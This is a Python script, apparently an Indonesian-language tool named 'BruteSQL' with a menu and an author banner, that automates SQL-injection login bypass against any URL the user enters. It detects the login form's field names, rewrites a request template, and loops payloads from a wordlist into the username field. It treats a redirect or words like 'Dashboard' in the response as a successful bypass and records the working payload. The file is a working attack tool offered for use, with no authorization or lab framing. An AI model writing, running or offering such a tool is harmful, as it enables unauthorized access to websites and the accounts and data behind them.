import requests
import urllib3
import colorama
from colorama import Fore, Style
import os
from urllib.parse import urlparse
from bs4 import BeautifulSoup

colorama.init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

os.system('clear')
adi = """
┏━ Select Menu ━━━━━━
┣ [1] Jalankan Bypass
┣ [2] Deteksi Form login
┣ [3] Cek isi req.txt
┣ [4] Edit File req.txt
┣━ Information ━━━━━━
┣ [!] Created by Adiganzzxd
┣ [!] telegram : t.me/Adiganzzxd
┣ [!] github : Adiganzzxd
┗━━━━━━━━━━━━━━━━━━━
"""
# ──────── Banner ──────── #
banners = """ 
 ____             _       ____   ___  _
| __ ) _ __ _   _| |_ ___/ ___| / _ \| | v.1.0
|  _ \| '__| | | | __/ _ \___ \| | | | |
| |_) | |  | |_| | ||  __/___) | |_| | |___
|____/|_|   \__,_|\__\___|____/ \__\_\_____|
"""

print(Fore.WHITE + banners +Fore.RED + adi)

# ──────── Input Target ──────── #
if not os.path.exists("req.txt") or not os.path.exists("list.txt"):
    print(Fore.RED + "\n[!] File 'req.txt' atau 'list.txt' tidak ditemukan!")
    exit()

menu = input(Fore.YELLOW + "\nPilih Menu [1/2/3/4] > ")
if menu == "4":
  os.system('nano req.txt')
  exit()

elif menu == "3":
    print(Fore.CYAN + "\n[!] Menampilkan isi req.txt:\n")
    os.system("cat req.txt")
    exit()

elif menu == "2":
    os.system("python detectform.py")
    exit()

elif menu != "1":
    print(Fore.RED + "[!] Pilihan tidak valid!")
    exit()

# ──────── Jalankan BruteForce [1] ──────── #
target_url = input(Fore.WHITE + "\n Masukkan alamat target :\n > ").strip()

# ──────── Deteksi Field Username & Password otomatis ──────── #
def detect_input_fields(url):
    try:
        res = requests.get(url, timeout=10, verify=False)
        soup = BeautifulSoup(res.text, 'html.parser')
        user_input = soup.find('input', {'type': 'text'})
        pass_input = soup.find('input', {'type': 'password'})

        username_field = user_input.get('name') if user_input else None
        password_field = pass_input.get('name') if pass_input else None

        return username_field, password_field
    except Exception as e:
        print(Fore.RED + f"[!] Error deteksi input: {e}")
        return None, None

user_field, pass_field = detect_input_fields(target_url)
if not user_field or not pass_field:
    print(Fore.RED + "[!] Gagal mendeteksi field input.")
    exit()

# ──────── Update req.txt secara otomatis ──────── #
try:
    with open("req.txt", "r") as f:
        lines = f.read().splitlines()

    body_index = lines.index("")
    headers = lines[:body_index]
    body = f"{user_field}=§PAYLOAD§&{pass_field}=test123"
    new_req = "\n".join(headers + ["", body])

    with open("req.txt", "w") as f:
        f.write(new_req)
    print(Fore.GREEN + f"[✓] req.txt berhasil diupdate otomatis!")
except Exception as e:
    print(Fore.RED + f"[!] Gagal update req.txt: {e}")
    exit()

# ──────── Fungsi Baca & Parse req.txt ──────── #
def parse_request_file(filename, target_url):
    with open(filename, 'r') as file:
        lines = file.read().splitlines()

    header_lines, body = [], ""
    in_body = False
    for line in lines:
        if line == "":
            in_body = True
            continue
        if in_body:
            body += line
        else:
            header_lines.append(line)

    if not header_lines:
        raise ValueError("req.txt kosong atau tidak valid.")

    parsed = urlparse(target_url)
    real_path = parsed.path or "/"
    real_host = parsed.netloc

    # Ganti placeholder
    header_lines = [line.replace("$HOSTS", real_host).replace("$PATHS", real_path) for line in header_lines]

    method, _, _ = header_lines[0].split()
    headers = {}
    for line in header_lines[1:]:
        key, value = line.split(": ", 1)
        headers[key] = value

    return method, headers, body

# ──────── Proses Request & Payload ──────── #
method, headers, body_template = parse_request_file("req.txt", target_url)

with open("list.txt", "r") as f:
    payloads = [line.strip() for line in f if line.strip()]

print(Fore.CYAN + f"\n[+] Memulai brute force ke: {target_url}\n")

for payload in payloads:
    body = body_template.replace("§PAYLOAD§", payload)

    try:
        response = requests.request(
            method, target_url,
            headers=headers,
            data=body,
            timeout=10,
            verify=False
        )
    except requests.exceptions.RequestException as e:
        print(Fore.YELLOW + f"[!] Koneksi error: {e}")
        continue

    if ("Welcome" in response.text or "Dashboard" in response.text or "Logout" in response.text 
        or response.status_code in [302, 301]):
        print(Fore.GREEN + "SQLi Bypass BERHASIL!")
        print(Fore.GREEN + f"[!] Url : {target_url}")
        print(Fore.GREEN + f"[!] Payload : {payload}")
        print(Fore.GREEN + f"[!] Field : {user_field} - {pass_field}")
        with open("hasil.txt", "w") as out:
            out.write(f"Payload berhasil : {payload}\n")
        break
    else:
        print(Fore.WHITE + "[-] Gagal Mencoba query :", Fore.YELLOW + payload)
        